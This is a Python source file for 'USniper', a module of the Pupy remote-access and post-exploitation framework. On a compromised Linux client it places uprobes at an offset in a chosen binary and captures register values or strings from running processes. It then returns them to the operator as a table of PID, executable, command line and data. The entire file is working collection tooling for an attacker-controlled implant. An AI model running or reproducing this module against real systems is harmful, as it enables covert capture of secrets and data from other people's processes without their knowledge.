# -*- coding: utf-8 -*-

from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import obtain
from pupylib.PupyCmd import PupyCmd

__class_name__ = 'USniper'

@config(cat='gather', compat=['linux'])
class USniper(PupyModule):
    ''' Globally capture string or register during execution at specified
        physical offset and register using uprobes. Compatible with
        kernels >3.5 (register) and >3.18 (string) '''

    unique_instance = True
    dependencies = {
        'linux': [ 'usniper' ]
    }

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='usniper', description=self.__doc__)
        commands = self.arg_parser.add_subparsers(help='commands')
        start = commands.add_parser('start', help='Start USniper')
        start.add_argument('-S', '--string', action='store_true',
            default=False, help='Dereference as string (>3.18)')
        start.add_argument('-R', '--ret', action='store_true', default=False,
            help='Get value after return')
        start.add_argument('-C', '--nochar', action='store_true',
            default=False, help='Do not cast register to character')
        start.add_argument('path', help='Absolute path to binary')
        start.add_argument('offset', help='Offset in binary')
        start.add_argument('reg', default='ax', nargs='?',
                               help='Get value from register')
        start.set_defaults(func=self.start)

        stop = commands.add_parser('stop', help='stop USniper')
        stop.set_defaults(func=self.stop)

        dump = commands.add_parser('dump', help='dump results')
        dump.set_defaults(func=self.dump)

    def start(self, args):
        if self.client.conn.modules['usniper'].start(
                args.path,
                args.offset,
                args.reg,
                args.ret,
                'string' if args.string else None,
                None if ( args.string or args.nochar ) else 'chr'
            ):
            self.success('Unsipper started')
        else:
            self.error('Usniper start failed')

    def stop(self, args):
        self.client.conn.modules['usniper'].stop()
        self.success('Stop request was sent')

    def dump(self, args):
        data = self.client.conn.modules['usniper'].dump()
        if not data:
            self.warning('No data collected')
            return

        records = []

        data = obtain(data)
        for pid, values in data.iteritems():
            for timestamp, dumps in values['dump'].iteritems():
                if all(len(x) == 1 and type(x) in (str,unicode) for x in dumps):
                    records.append({
                        'PID': pid,
                        'EXE': values['exe'],
                        'CMD': ' '.join(values['cmd']),
                        'DATA': ''.join(dumps)
                    })
                else:
                    for dump in dumps:
                        records.append({
                            'PID': pid,
                            'DATA': dump,
                            'EXE': values['exe'],
                            'CMD': ' '.join(values['cmd'])
                        })

        self.log(PupyCmd.table_format(records, wl=['PID', 'EXE', 'CMD', 'DATA']))

    def run(self, args):
        args.func(args)
